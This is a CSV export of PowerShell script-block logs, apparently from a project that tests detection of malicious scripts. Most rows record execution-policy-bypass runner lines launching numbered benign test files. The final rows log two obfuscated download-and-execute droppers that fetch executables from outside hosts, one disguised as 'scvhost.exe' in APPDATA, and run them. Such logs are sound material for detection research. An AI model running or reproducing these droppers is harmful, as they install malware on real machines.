"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/5/2026 8:31:37 AM","","9","$global:?"
"8/5/2026 8:31:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:31:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:31:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:31:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:31:36 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\51.ps1'"
"8/5/2026 8:31:32 AM","","9","$global:?"
"8/5/2026 8:31:31 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:31:31 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:31:31 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:31:31 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:31:31 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\47.ps1'"
"8/5/2026 8:31:24 AM","","9","$global:?"
"8/5/2026 8:31:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:31:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:31:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:31:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:31:24 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\46.ps1'"
"8/5/2026 8:31:18 AM","","9","$global:?"
"8/5/2026 8:31:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:31:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:31:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:31:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:31:18 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\38.ps1'"
"8/5/2026 8:31:12 AM","","9","$global:?"
"8/5/2026 8:31:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:31:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:31:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:31:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:31:12 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\37.ps1'"
"8/5/2026 8:31:05 AM","","9","$global:?"
"8/5/2026 8:31:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:31:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:31:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:31:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:31:05 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\33.ps1'"
"8/5/2026 8:30:54 AM","","9","$global:?"
"8/5/2026 8:30:54 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:30:54 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:30:54 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:30:54 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:30:54 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\17.ps1'"
"8/5/2026 8:30:49 AM","","9","$global:?"
"8/5/2026 8:30:49 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:30:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:30:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:30:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:30:49 AM","C:\TA\project-ta\data_spliting\test_set\benign\12.ps1","569","$poshGitModule = Get-Module posh-git -ListAvailable | Sort-Object Version -Descending | Select-Object -First 1; if ($poshGitModule) {; $poshGitModule | Import-Module; }; elseif (Test-Path -LiteralPath"
"8/5/2026 8:30:49 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\12.ps1'"
"8/5/2026 8:30:44 AM","","9","$global:?"
"8/5/2026 8:30:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:30:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:30:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:30:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:30:44 AM","","146","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\6.ps1'"
"8/5/2026 8:30:36 AM","","9","$global:?"
"8/5/2026 8:30:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:30:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:30:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:30:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:30:36 AM","","146","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\3.ps1'"
"8/5/2026 8:30:05 AM","","9","$global:?"
"8/5/2026 8:30:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:30:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:30:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:30:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:30:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\124.ps1","128","(NeW`-`Obj`ECt System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');s`TART-pr`o`cesS 'fleeb.exe'
"
"8/5/2026 8:30:05 AM","","174","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\124.ps1'"
"8/5/2026 8:29:58 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\112.ps1","166","(New`-`ObJeCt System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");S`Tart-P`ROC`eSs (""$env:APPDATA\scvhost.exe"")
"
